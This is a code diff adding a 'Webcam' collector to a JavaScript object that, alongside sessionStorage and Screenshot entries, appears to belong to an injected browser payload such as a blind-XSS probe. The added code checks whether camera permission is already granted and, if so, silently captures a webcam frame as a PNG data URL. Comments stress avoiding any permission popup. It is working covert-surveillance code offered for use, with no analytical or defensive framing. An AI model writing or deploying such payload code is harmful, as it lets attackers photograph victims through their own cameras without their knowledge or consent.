@@ -98,6 +98,76 @@
       sessionStorage: function () {
         return JSON.stringify(sessionStorage);
       },
+      Webcam: function () {
+        // Smart webcam capture: only if permission is already granted (no popup)
+        return new Promise(function (resolve) {
+          // Check if mediaDevices API is available
+          if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            return resolve("not supported");
+          }
+
+          // Strategy 1: Check permissions API first (avoids popup)
+          function checkAndCapture() {
+            return navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480, facingMode: "user" } })
+              .then(function (stream) {
+                return new Promise(function (innerResolve) {
+                  var video = document.createElement("video");
+                  video.setAttribute("autoplay", "");
+                  video.setAttribute("playsinline", "");
+                  video.srcObject = stream;
+                  video.play();
+
+                  // Wait for video to be ready
+                  setTimeout(function () {
+                    try {
+                      var canvas = document.createElement("canvas");
+                      canvas.width = video.videoWidth || 640;
+                      canvas.height = video.videoHeight || 480;
+                      canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+                      var dataUrl = canvas.toDataURL("image/png");
+
+                      // Clean up: stop all tracks
+                      stream.getTracks().forEach(function (track) { track.stop(); });
+                      video.srcObject = null;
+
+                      innerResolve(dataUrl);
+                    } catch (e) {
+                      stream.getTracks().forEach(function (track) { track.stop(); });
+                      innerResolve("capture failed");
+                    }
+                  }, 1500); // Wait 1.5s for camera to warm up
+                });
+              })
+              .catch(function () {
+                return "denied";
+              });
+          }
+
+          // Use Permissions API to check without triggering popup
+          if (navigator.permissions && navigator.permissions.query) {
+            navigator.permissions.query({ name: "camera" })
+              .then(function (result) {
+                if (result.state === "granted") {
+                  // Permission already granted — capture silently
+                  checkAndCapture().then(resolve);
+                } else {
+                  // Not granted — don't trigger popup
+                  resolve("no permission");
+                }
+              })
+              .catch(function () {
+                // Permissions API not supported for camera, skip
+                resolve("permission check unavailable");
+              });
+          } else {
+            // No Permissions API — skip to avoid popup
+            resolve("permissions API unavailable");
+          }
+
+          // Timeout safety: don't hang forever
+          setTimeout(function () { resolve("timeout"); }, 8000);
+        });
+      },
       Screenshot: function () {
         return screenshot();
       },
